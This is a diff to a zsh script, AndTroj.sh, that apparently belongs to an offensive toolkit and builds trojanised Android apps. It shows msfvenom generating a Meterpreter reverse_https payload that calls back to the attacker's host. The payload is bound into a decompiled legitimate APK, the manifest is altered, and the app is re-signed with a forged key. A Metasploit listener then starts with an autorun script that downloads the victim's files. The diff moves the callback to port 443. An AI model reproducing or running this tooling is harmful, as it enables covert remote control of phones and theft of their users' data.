@@ -1,6 +1,6 @@
 #!/bin/zsh
-# v65
-# ┌──(unk9vvn㉿avi)-[~]
+# v67
+# ┌──(avi㉿unk9vvn)-[~]
 # └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $NoIP $APK $URL
 
 
@@ -135,7 +135,7 @@ function BANNER()
 }
 
 
-function join_by
+function join_by()
 {
 	local d=${1-} f=${2-}; if shift 2; then printf %s "$f" "${@/#/$d}"; fi;
 }
@@ -163,9 +163,9 @@ function BINDER()
 		rm -r $PAYLOAD
 	fi
 
-	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:8443$YELLOW"
+	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	service postgresql start
-	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=50000 -o payload.apk
+	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=443 -o payload.apk
 	BANNER
 	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
@@ -179,10 +179,10 @@ function BINDER()
 	fi
 
 
-	# Change ANDROID API Version
+	# Change Android API Version
 	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
 	PACKAGE=`head -n 1 ${ORGAPK}/AndroidManifest.xml | sed -r 's/.*package="([^"]*)".*/\1/'`
-	sed -i "1s#.*#<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"$PACKAGE\" platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0\">#" "${ORGAPK}/AndroidManifest.xml"
+	sed -i "1s#.*#<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"$PACKAGE\" platformBuildVersionCode=\"31\" platformBuildVersionName=\"12\">#" "${ORGAPK}/AndroidManifest.xml"
 
 
 	# Set Permissions
@@ -329,10 +329,11 @@ download -r *" > /tmp/autoand.rc
 	else
 		keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg $CERT_TYPE -keysize $CERT_LENGTH -validity $CERT_EDT -dname "$DNAME" > /dev/null
 	fi
+
 	mv $ORGAPK/dist/$OUTPUT.apk "$SCRIPT_DIR/$OUTPUT-b.apk"
 	jarsigner -verbose -sigalg $CERT_SIG -digestalg $CERT_DIGEST -keystore /tmp/unk9vvn.keystore "$OUTPUT-b.apk" signing.key -storepass 12341234 > /dev/null
 	BANNER
-	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:8443$YELLOW"
+	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
 	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
 	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
@@ -342,7 +343,7 @@ download -r *" > /tmp/autoand.rc
 	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
 	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
 	echo -e "$GREEN [*]$YELLOW Launching Msfconsole Listening$WHITE"
-	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 50000;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
+	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 443;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
 }
 
 
